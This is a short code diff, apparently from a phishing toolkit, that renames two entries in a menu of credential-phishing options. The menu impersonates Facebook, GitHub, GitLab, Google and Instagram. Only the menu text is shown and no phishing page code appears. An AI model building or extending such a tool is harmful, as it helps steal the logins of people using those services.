@@ -77,8 +77,8 @@ else:
    #options
 
 print ('\x1b[1;32;40m' +'press (1) to use  Facebook phishing''\x1b[0m')
-print ('\x1b[1;32;40m' +'press (2) to use  phishing phishing''\x1b[0m')
-print ('\x1b[1;32;40m' +'press (3) to use  phishing phishing''\x1b[0m')
+print ('\x1b[1;32;40m' +'press (2) to use  github phishing''\x1b[0m')
+print ('\x1b[1;32;40m' +'press (3) to use  gitlab phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (4) to use  google phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (5) to use  Instafollowers phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (6) to use  InstaGram phishing''\x1b[0m')
